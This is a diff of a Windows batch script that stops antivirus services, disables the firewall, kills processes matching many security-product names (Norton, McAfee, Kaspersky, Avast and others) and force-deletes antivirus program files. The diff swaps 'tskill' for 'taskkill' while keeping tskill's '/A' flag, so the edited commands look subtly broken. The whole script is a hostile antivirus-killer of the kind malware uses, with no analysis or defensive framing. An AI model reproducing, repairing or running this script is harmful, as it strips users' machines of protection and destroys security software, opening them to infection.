@@ -2,82 +2,82 @@
 net stop "symantec antivirus"
 net stop “Security Center”
 netsh firewall set opmode mode=disable
-tskill /A av*
-tskill /A fire*
-tskill /A anti*
+taskkill /A av*
+taskkill /A fire*
+taskkill /A anti*
 cls
-tskill /A spy*
-tskill /A bullguard
-tskill /A PersFw
-tskill /A KAV*
-tskill /A ZONEALARM
-tskill /A SAFEWEB
+taskkill /A spy*
+taskkill /A bullguard
+taskkill /A PersFw
+taskkill /A KAV*
+taskkill /A ZONEALARM
+taskkill /A SAFEWEB
 cls
-tskill /A OUTPOST
-tskill /A nv*
-tskill /A nav*
-tskill /A F-*
-tskill /A ESAFE
-tskill /A cle
+taskkill /A OUTPOST
+taskkill /A nv*
+taskkill /A nav*
+taskkill /A F-*
+taskkill /A ESAFE
+taskkill /A cle
 cls
-tskill /A BLACKICE
-tskill /A def*
-tskill /A kav
-tskill /A kav*
-tskill /A avg*
-tskill /A ash*
+taskkill /A BLACKICE
+taskkill /A def*
+taskkill /A kav
+taskkill /A kav*
+taskkill /A avg*
+taskkill /A ash*
 cls
-tskill /A aswupdsv
-tskill /A ewid*
-tskill /A guard*
-tskill /A guar*
-tskill /A gcasDt*
-tskill /A msmp*
+taskkill /A aswupdsv
+taskkill /A ewid*
+taskkill /A guard*
+taskkill /A guar*
+taskkill /A gcasDt*
+taskkill /A msmp*
 cls
-tskill /A mcafe*
-tskill /A mghtml
-tskill /A msiexec
-tskill /A outpost
-tskill /A isafe
-tskill /A zap*
+taskkill /A mcafe*
+taskkill /A mghtml
+taskkill /A msiexec
+taskkill /A outpost
+taskkill /A isafe
+taskkill /A zap*
 cls
-tskill /A zauinst
-tskill /A upd*
-tskill /A zlclien*
-tskill /A minilog
-tskill /A cc*
-tskill /A norton*
+taskkill /A zauinst
+taskkill /A upd*
+taskkill /A zlclien*
+taskkill /A minilog
+taskkill /A cc*
+taskkill /A norton*
 cls
-tskill /A norton au*
-tskill /A ccc*
-tskill /A npfmn*
-tskill /A loge*
-tskill /A nisum*
-tskill /A issvc
-tskill /A tmp*
+taskkill /A norton au*
+taskkill /A ccc*
+taskkill /A npfmn*
+taskkill /A loge*
+taskkill /A nisum*
+taskkill /A issvc
+taskkill /A tmp*
 cls
-tskill /A tmn*
-tskill /A pcc*
-tskill /A cpd*
-tskill /A pop*
-tskill /A pav*
-tskill /A padmin
+taskkill /A tmn*
+taskkill /A pcc*
+taskkill /A cpd*
+taskkill /A pop*
+taskkill /A pav*
+taskkill /A padmin
 cls
-tskill /A panda*
-tskill /A avsch*
-tskill /A sche*
-tskill /A syman*
-tskill /A virus*
-tskill /A realm*
+taskkill /A panda*
+taskkill /A avsch*
+taskkill /A sche*
+taskkill /A syman*
+taskkill /A virus*
+taskkill /A realm*
 cls
-tskill /A sweep*
-tskill /A scan*
-tskill /A ad-*
-tskill /A safe*
-tskill /A avas*
-tskill /A norm*
+taskkill /A sweep*
+taskkill /A scan*
+taskkill /A ad-*
+taskkill /A safe*
+taskkill /A avas*
+taskkill /A norm*
 cls
-tskill /A offg*
+taskkill /A offg*
 del /Q /F C:\Program Files\alwils~1\avast4\*.*
 del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
 del /Q /F C:\Program Files\kasper~1\*.exe
